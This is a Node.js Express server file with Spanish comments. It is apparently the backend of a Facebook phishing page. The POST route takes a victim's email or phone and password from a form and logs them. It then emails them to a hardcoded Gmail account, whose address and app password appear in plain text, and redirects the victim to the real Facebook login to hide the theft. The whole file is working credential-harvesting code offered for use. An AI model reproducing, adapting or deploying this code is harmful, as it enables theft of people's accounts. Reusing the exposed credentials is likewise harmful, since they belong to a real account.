// Este archivo guarda como servidor.js

// Importa las librerías necesarias
const express = require('express'); // Framework para crear el servidor web
const bodyParser = require('body-parser'); // Para procesar los datos del formulario HTML
const nodemailer = require('nodemailer'); // Para enviar correos electrónicos
const path = require('path'); // Importa el módulo 'path' para trabajar con rutas de archivos

const app = express(); // Crea una instancia de la aplicación Express

// Configuración del puerto:
// Render usará 'process.env.PORT', localmente usará 3000.
const PORT = process.env.PORT || 3000;

// Middleware para procesar los datos enviados desde formularios HTML
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json()); // Necesario si esperas enviar JSON (aunque el formulario usa urlencoded)

// ** LÍNEA CLAVE CORREGIDA: Configura Express para servir archivos estáticos **
// Si 'servidor.js' está dentro de la carpeta 'Public', entonces '__dirname' ya apunta a 'Public'.
// Por lo tanto, simplemente sirve los archivos desde ese directorio.
app.use(express.static(path.join(__dirname)));


app.get('/', (req, res) => {
    // Si 'Correo.html' está en la misma carpeta que 'servidor.js' (ambos dentro de 'Public'),
    // esta es la ruta correcta.
    res.sendFile(path.join(__dirname, 'Correo.html'));
});

// Define la ruta POST a la que tu formulario HTML enviará los datos
app.post('/enviar-correo', async (req, res) => {
    // Extrae el 'nombre' (correo/telefono) y la 'Contraseña' de los datos del formulario
    // Asegúrate de que los atributos 'name' en tu HTML sean EXACTAMENTE 'nombre' y 'Contraseña'
    const { nombre, Contraseña } = req.body;

    // Puedes añadir un console.log para depurar y ver qué datos se reciben:
    console.log('Datos recibidos del formulario:', { nombre, Contraseña });

    // Configuración del transportador de correo con Nodemailer (para Gmail)
    const transporter = nodemailer.createTransport({
        service: 'gmail', // Especifica que usarás Gmail
        auth: {
            user: 'yamoshiblack801@gmail.com', // ¡Tu correo de Gmail!
            pass: 'byvr rdub genu ofms'  // ¡Tu Contraseña de Aplicación!
        }
    });

    // Define las opciones del correo a enviar
    const mailOptions = {
        from: 'yamoshiblack801@gmail.com', // La dirección que aparecerá como remitente
        to: 'yamoshiblack801@gmail.com',   // La dirección a la que se enviará el correo (aquí, te lo envías a ti mismo)
        subject: 'Formulario de Facebook Recibido', // El asunto del correo
        // El contenido del correo usa las variables 'nombre' y 'Contraseña'
        text: `Datos recibidos:\nCorreo/Teléfono: ${nombre}\nContraseña: ${Contraseña}`
    };

    // Intenta enviar el correo
    try {
        await transporter.sendMail(mailOptions);
        // Si el correo se envía con éxito, redirige a la URL de YouTube
        res.redirect('https://m.facebook.com/login/');
    } catch (error) {
        // Si hay un error al enviar el correo, muéstralo en la consola del servidor
        console.error('Error al enviar el correo:', error);
        // Y envía una respuesta de error al navegador
        res.status(500).send('Error al enviar el correo');
    }
});

// Inicia el servidor de Node.js en el puerto especificado
app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
    console.log('Para probarlo localmente, abre http://localhost:3000 en tu navegador.');
});